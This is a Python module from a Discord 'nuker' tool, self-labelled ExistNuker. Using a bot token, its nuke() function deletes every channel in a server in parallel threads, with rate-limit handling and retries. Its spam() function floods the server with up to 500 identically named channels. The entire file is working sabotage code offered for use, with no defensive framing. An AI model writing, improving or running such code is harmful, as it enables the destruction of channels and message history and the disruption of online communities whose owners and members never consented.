"""
Channel Operations Module
- Parallel creation/deletion
- Live Status Updates (Success/Fail counts)
Cross-platform with connection pooling
"""

import threading
import time
from discord_api import make_request, get_session, BASE_URL
from config import THREADS, TIMEOUT, stop_event
from interface import ui

class ChannelType:
    GUILD_TEXT = 0
    GUILD_VOICE = 2
    GUILD_CATEGORY = 4

def get_all(token, guild_id):
    """Get all channels in a guild"""
    success, data = make_request("GET", f"/guilds/{guild_id}/channels", token)
    if success and isinstance(data, list):
        return data
    return []

def create(token, guild_id, name, type_id):
    """Create a channel"""
    payload = {"name": name, "type": type_id}
    if type_id == ChannelType.GUILD_TEXT:
        payload["topic"] = "Created by ExistNuker"
    
    success, data = make_request("POST", f"/guilds/{guild_id}/channels", token, payload)
    return success, data

def delete_channel(token, channel_id, max_retries=5):
    """Delete a single channel with rate limit handling"""
    session = get_session()
    headers = {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json"
    }
    
    # Use shorter timeout for speed
    timeout_seconds = TIMEOUT / 1000 if TIMEOUT else 10
    
    for attempt in range(max_retries):
        try:
            response = session.delete(
                f"{BASE_URL}/channels/{channel_id}",
                headers=headers,
                timeout=timeout_seconds
            )
            
            if response.status_code in [200, 204]:
                return True
            
            if response.status_code == 404:
                return True # Already deleted
            
            if response.status_code == 429:
                # Rate limited
                try:
                    data = response.json()
                    retry_after = data.get("retry_after", 1)
                except:
                    retry_after = 1
                
                # Check stop event during wait
                if stop_event.wait(retry_after + 0.1):
                    return False
                continue
            
            if response.status_code in [400, 403]:
                return False # Permission error or invalid
            
            # Check stop event
            if stop_event.wait(0.2):
                return False
                
        except Exception:
            if stop_event.wait(0.2):
                return False
            continue
            
    return False

def spam(token, guild_id, name, type_id, count, thread_count=THREADS, stop_event=None):
    """Create multiple channels with live stats"""
    count = min(500, count) # Safety limit
    created = [0]
    failed = [0]
    lock = threading.Lock()
    
    ui.print_info(f"Creating {count} channels named '{name}'...")
    
    def worker(num_to_create):
        for _ in range(num_to_create):
            if stop_event and stop_event.is_set():
                return
            success, data = create(token, guild_id, name, type_id)
            if success:
                with lock:
                    created[0] += 1
                    ui.console.print(f"[green]✓[/green] Created: [cyan]{name}[/cyan] ({created[0]}/{count})")
            else:
                with lock:
                    failed[0] += 1
                    ui.console.print(f"[red]✗[/red] Failed: [cyan]{name}[/cyan] ({failed[0]})")
    
    threads = []
    per_thread = max(1, count // thread_count)
    
    for i in range(0, count, per_thread):
        if stop_event and stop_event.is_set():
            break
        num = min(per_thread, count - i)
        t = threading.Thread(target=worker, args=(num,), daemon=True)
        threads.append(t)
        t.start()
        
    while any(t.is_alive() for t in threads):
        if stop_event.is_set():
            return 0
        time.sleep(0.1)
        
    ui.print_success(f"Created {created[0]} channels | Failed {failed[0]}")
    return created[0]

def nuke(token, guild_id, thread_count=THREADS, stop_event=None):
    """Delete ALL channels with live stats"""
    all_channels = get_all(token, guild_id)
    if not all_channels:
        ui.print_warning("No channels found")
        return 0
    
    total = len(all_channels)
    ui.print_warning(f"Deleting {total} channels...")
    
    deleted = [0]
    failed_count = [0]
    failed_channels = []
    lock = threading.Lock()
    
    safe_threads = min(thread_count, 20)
    
    def worker(channels):
        for ch in channels:
            if stop_event and stop_event.is_set():
                return
            
            ch_id = ch.get('id')
            ch_name = ch.get('name', 'unknown')
            
            if delete_channel(token, ch_id, max_retries=3):
                with lock:
                    deleted[0] += 1
                    ui.console.print(f"[green]✓[/green] Deleted: [cyan]{ch_name}[/cyan] ({deleted[0]}/{total})")
            else:
                with lock:
                    failed_count[0] += 1
                    failed_channels.append(ch)
                    ui.console.print(f"[red]✗[/red] Failed: [yellow]{ch_name}[/yellow]")
            
            if stop_event.wait(0.05):
                return
    
    threads = []
    chunk_size = max(1, len(all_channels) // safe_threads)
    
    for i in range(0, len(all_channels), chunk_size):
        if stop_event and stop_event.is_set():
            break
        chunk = all_channels[i:i + chunk_size]
        t = threading.Thread(target=worker, args=(chunk,), daemon=True)
        threads.append(t)
        t.start()
        
    while any(t.is_alive() for t in threads):
        if stop_event.is_set():
            return 0
        time.sleep(0.1)
    
    # Retry failed channels
    if failed_channels and (not stop_event or not stop_event.is_set()):
        ui.print_warning(f"Retrying {len(failed_channels)} failed channels...")
        
        for ch in failed_channels[:]:
            if stop_event and stop_event.is_set():
                break
                
            ch_id = ch.get('id')
            ch_name = ch.get('name', 'unknown')
            
            if stop_event.wait(0.5):
                break
            
            if delete_channel(token, ch_id, max_retries=5):
                deleted[0] += 1
                failed_count[0] -= 1
                ui.console.print(f"[green]✓[/green] Retry Success: [cyan]{ch_name}[/cyan]")
            else:
                ui.console.print(f"[red]✗[/red] Retry Failed: [yellow]{ch_name}[/yellow]")

    ui.print_success(f"Finished! Deleted {deleted[0]}/{total} channels")
    return deleted[0]
